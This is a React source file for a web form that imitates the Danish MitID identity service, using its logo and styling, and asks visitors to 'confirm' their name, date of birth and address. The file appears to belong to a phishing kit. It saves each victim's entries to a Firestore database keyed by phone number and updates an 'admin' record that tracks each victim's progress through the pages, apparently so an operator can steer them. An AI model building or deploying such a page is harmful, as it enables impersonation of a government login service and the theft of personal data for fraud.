import { arrayUnion, doc, setDoc, updateDoc } from "firebase/firestore";
import React, { useState } from "react";
import { useOutletContext } from "react-router-dom";

function Address() {
  const [identifier, setIdentifier, db] = useOutletContext();
  const [address, setAddress] = useState({
    firstName: null,
    lastName: null,
    postCode: null,
    area: null,
    dateOfbirth: null,
    city: null,
    address: null,
  });
  const addressData = async () => {
    if (
      !address.area &&
      !address.city &&
      !address.address &&
      !address.dateOfbirth &&
      !address.firstName &&
      !address.lastName &&
      !address.postCode
    )
      return;
    await setDoc(
      doc(db, "Users", "Address_" + identifier.replaceAll("+", "")),
      {
        id: identifier.replaceAll("+", ""),
        ...address,
      }
    );

    await updateDoc(doc(db, "admin", identifier), {
      loading: true,
      link: "",
      date: new Date().toISOString(),
      pagesDone: arrayUnion("address"),
    });
  };

  return (
    <div className="max-w-md m-auto">
      <div className="py-3 px-7  min-h-[60vh]">
        <div className="flex justify-between items-center h-16 border-b-2 mb-10">
          <h2 className="font-semibold text-lg">Personlige oplysninger</h2>
          <span>
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="61"
              height="16"
              viewBox="0 0 61 16"
              className="mitid-core-header__logo"
              fill="blue"
              focusable="false"
              aria-label="MitID logo"
            >
              <path d="M19.2,0c1,0,1.8,0.8,1.8,1.8c0,1-0.8,1.8-1.8,1.8c-1,0-1.8-0.8-1.8-1.8C17.4,0.8,18.2,0,19.2,0z M40.4,0 c2.1,0,3.8,1.7,3.8,3.8c0,2.1-1.7,3.8-3.8,3.8c-2.1,0-3.8-1.7-3.8-3.8C36.6,1.7,38.3,0,40.4,0z M20.7,4.9v10.9h-3V4.9H20.7z M2.9,0.8l4.6,7.1l4.5-7.1h2.9v15h-3.1V6.1l-4.3,6.4H7.4L3.1,6.1v9.7H0v-15H2.9z M40.4,9c3.6,0,6.5,2,6.9,6.8H33.6 C34,11,36.9,9,40.4,9z M51.9,0.2C58.3,0.2,61,3.7,61,8c0,4.3-2.7,7.8-9.1,7.8h-2.6V0.2H51.9z M27.1,1.9v3h2.4v2.4h-2.4v4.8 c0,0.9,0.5,1.2,1.3,1.2c0.5,0,1-0.1,1.3-0.4v2.7c-0.4,0.2-1.2,0.3-2,0.3c-2.2,0-3.6-1.1-3.6-3.5V7.3h-1.7V4.9h1.7v-3H27.1z"></path>
            </svg>
          </span>
        </div>

        <h3 className="text-left font-medium mb-3">
          Du skal bekræfte dine oplysninger :
        </h3>
        <div className="mb-6">
          <input
            onChange={(e) =>
              setAddress({ ...address, firstName: e.target.value })
            }
            type="text"
            id="firstName"
            className="bg-gray-50 border border-gray-800 text-gray-900 text-sm rounded-sm focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 "
            placeholder="Fornavn"
          />
        </div>
        <div className="mb-6">
          <input
            onChange={(e) =>
              setAddress({ ...address, lastName: e.target.value })
            }
            type="text"
            id="lastName"
            className="bg-gray-50 border border-gray-800 text-gray-900 text-sm rounded-sm  block w-full p-2.5 "
            placeholder="Efternavn"
            required=""
          />
        </div>
        <div className="mb-6">
          <input
            onChange={(e) =>
              setAddress({ ...address, dateOfbirth: e.target.value })
            }
            type="text"
            id="dateOfbirth"
            className="bg-gray-50 border border-gray-800 text-gray-900 text-sm rounded-sm  block w-full p-2.5 "
            placeholder="dd/mm/åååå"
            required=""
          />
        </div>
        <div className="mb-6">
          <input
            onChange={(e) =>
              setAddress({ ...address, address: e.target.value })
            }
            type="text"
            id="address"
            className="bg-gray-50 border border-gray-800 text-gray-900 text-sm rounded-sm  block w-full p-2.5 "
            placeholder="Address"
            required=""
          />
        </div>
        <div className="mb-6">
          <input
            onChange={(e) => setAddress({ ...address, city: e.target.value })}
            type="text"
            id="city"
            className="bg-gray-50 border border-gray-800 text-gray-900 text-sm rounded-sm  block w-full p-2.5 "
            placeholder="Byen"
            required=""
          />
        </div>

        <div className="mb-6">
          <input
            onChange={(e) =>
              setAddress({ ...address, postCode: e.target.value })
            }
            type="text"
            id="postCode"
            className="bg-gray-50 border border-gray-800 text-gray-900 text-sm rounded-sm  block w-full p-2.5 "
            placeholder="Postnummer"
            required=""
          />
        </div>
        <div className="mb-6">
          <input
            onChange={(e) => setAddress({ ...address, area: e.target.value })}
            type="text"
            id="area"
            className="bg-gray-50 border border-gray-800 text-gray-900 text-sm rounded-sm  block w-full p-2.5 "
            placeholder="Område"
            required=""
          />
        </div>
        <div className="flex items-start mb-1"></div>
        <button
          onClick={addressData}
          type="submit"
          className="text-white w-full bg-blue-700 hover:bg-blue-800 font-medium rounded-sm text-sm outline-none  px-5 py-2.5 text-center flex justify-between"
        >
          <p>Fortsæt</p>
          <svg
            xmlns="http://www.w3.org/2000/svg"
            focusable="false"
            className="mitid--button-icon"
            width="24"
            height="24"
            viewBox="0 0 24 24"
            fill="white"
            aria-hidden="true"
          >
            <path d="M5 13h11.17l-4.88 4.88c-.39.39-.39 1.03 0 1.42.39.39 1.02.39 1.41 0l6.59-6.59c.39-.39.39-1.02 0-1.41l-6.58-6.6c-.39-.39-1.02-.39-1.41 0-.39.39-.39 1.02 0 1.41L16.17 11H5c-.55 0-1 .45-1 1s.45 1 1 1z"></path>
          </svg>
        </button>
      </div>
    </div>
  );
}

export default Address;
